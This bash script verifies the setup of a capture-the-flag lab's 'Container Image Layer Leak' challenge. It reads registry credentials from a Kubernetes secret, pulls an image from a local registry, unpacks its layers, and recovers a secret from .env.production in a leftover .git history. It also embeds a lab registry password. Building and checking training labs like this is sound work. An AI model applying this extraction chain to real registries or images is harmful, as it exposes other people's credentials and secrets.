#!/bin/bash
# Test script for Attack #2 - Container Image Layer Leak

set -e

echo "==================================="
echo "Attack #2 Verification Script"
echo "==================================="
echo

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Step 1: Check registry is running
echo -e "${YELLOW}[1/7] Checking registry status...${NC}"
if kubectl get pods -n registry | grep -q "Running"; then
    echo -e "${GREEN}✓ Registry is running${NC}"
else
    echo -e "${RED}✗ Registry is not running${NC}"
    exit 1
fi

# Step 2: Verify image exists in registry
echo -e "\n${YELLOW}[2/7] Verifying image in registry...${NC}"
CATALOG=$(curl -k -s -u ctf-admin:CTFRegistryPass123! https://localhost:30000/v2/_catalog)
if echo "$CATALOG" | grep -q "recipe-api"; then
    echo -e "${GREEN}✓ recipe-api image found in registry${NC}"
else
    echo -e "${RED}✗ recipe-api image not found${NC}"
    echo "Catalog: $CATALOG"
    exit 1
fi

# Step 3: Check Attack #1 flag contains registry credentials
echo -e "\n${YELLOW}[3/7] Checking Attack #1 flag...${NC}"
FLAG=$(kubectl get secret ctf-flag -n ctf-challenge -o jsonpath='{.data.flag}' | base64 -d)
if echo "$FLAG" | grep -q "registry_layer_leak"; then
    echo -e "${GREEN}✓ Flag contains registry hint${NC}"
    echo "  Flag: $FLAG"
else
    echo -e "${RED}✗ Flag doesn't contain registry hint${NC}"
    exit 1
fi

# Step 4: Verify registry credentials in secret
echo -e "\n${YELLOW}[4/7] Verifying registry credentials...${NC}"
REG_USER=$(kubectl get secret ctf-flag -n ctf-challenge -o jsonpath='{.data.registry-user}' | base64 -d)
REG_PASS=$(kubectl get secret ctf-flag -n ctf-challenge -o jsonpath='{.data.registry-password}' | base64 -d)
if [[ "$REG_USER" == "ctf-admin" ]] && [[ "$REG_PASS" == "CTFRegistryPass123!" ]]; then
    echo -e "${GREEN}✓ Registry credentials are correct${NC}"
else
    echo -e "${RED}✗ Registry credentials are incorrect${NC}"
    exit 1
fi

# Step 5: Pull the image
echo -e "\n${YELLOW}[5/7] Pulling image...${NC}"
if podman pull localhost:30000/recipe-api:v1.0 --tls-verify=false > /dev/null 2>&1; then
    echo -e "${GREEN}✓ Image pulled successfully${NC}"
else
    echo -e "${RED}✗ Failed to pull image${NC}"
    exit 1
fi

# Step 6: Check for .git in layers
echo -e "\n${YELLOW}[6/7] Checking image layers for .git directory...${NC}"
TMPDIR=$(mktemp -d)
podman save localhost:30000/recipe-api:v1.0 -o "$TMPDIR/recipe-api.tar" 2>/dev/null
tar -xf "$TMPDIR/recipe-api.tar" -C "$TMPDIR" 2>/dev/null

GIT_FOUND=false
# Check .tar files directly (not nested layer.tar)
for layer in "$TMPDIR"/*.tar; do
    # Skip the main image.tar
    if [[ "$(basename $layer)" == "image.tar" ]] || [[ "$(basename $layer)" == "manifest.json" ]]; then
        continue
    fi

    if tar -tf "$layer" 2>/dev/null | grep -qE "(^\.git/|app/\.git/)"; then
        echo -e "${GREEN}✓ Found .git in layer: $(basename $layer)${NC}"
        GIT_FOUND=true

        # Extract this layer
        EXTRACT_DIR="$TMPDIR/extracted"
        mkdir -p "$EXTRACT_DIR"
        tar -xf "$layer" -C "$EXTRACT_DIR" 2>/dev/null

        # Step 7: Verify flag in git history
        echo -e "\n${YELLOW}[7/7] Extracting flag from git history...${NC}"
        cd "$EXTRACT_DIR"

        # Check for .git in current dir or app/
        if [ -d ".git" ]; then
            GIT_DIR=".git"
        elif [ -d "app/.git" ]; then
            cd app
            GIT_DIR=".git"
        else
            continue
        fi

        if [ -d "$GIT_DIR" ]; then
            # Get the first commit hash
            FIRST_COMMIT=$(git log --reverse --format=%H | head -1)

            # Try to extract .env.production
            if git show "$FIRST_COMMIT:.env.production" > /dev/null 2>&1; then
                FLAG_CONTENT=$(git show "$FIRST_COMMIT:.env.production" | grep "FLAG{" || true)
                if [ -n "$FLAG_CONTENT" ]; then
                    echo -e "${GREEN}✓ Flag found in git history!${NC}"
                    echo -e "${GREEN}$FLAG_CONTENT${NC}"
                else
                    echo -e "${RED}✗ No flag found in .env.production${NC}"
                fi
            else
                echo -e "${RED}✗ Could not extract .env.production${NC}"
            fi
        fi
        break
    fi
done

# Cleanup
rm -rf "$TMPDIR"

if [ "$GIT_FOUND" = true ]; then
    echo -e "\n${GREEN}==================================="
    echo "Attack #2 Setup: SUCCESSFUL"
    echo "===================================${NC}"
    echo
    echo "Participants can now:"
    echo "  1. Use credentials from Attack #1"
    echo "  2. Access registry at https://localhost:30000"
    echo "  3. Pull and analyze recipe-api:v1.0"
    echo "  4. Extract .git from image layers"
    echo "  5. Find the flag in git history"
else
    echo -e "\n${RED}==================================="
    echo "Attack #2 Setup: FAILED"
    echo "===================================${NC}"
    echo ".git directory not found in any layer"
    exit 1
fi
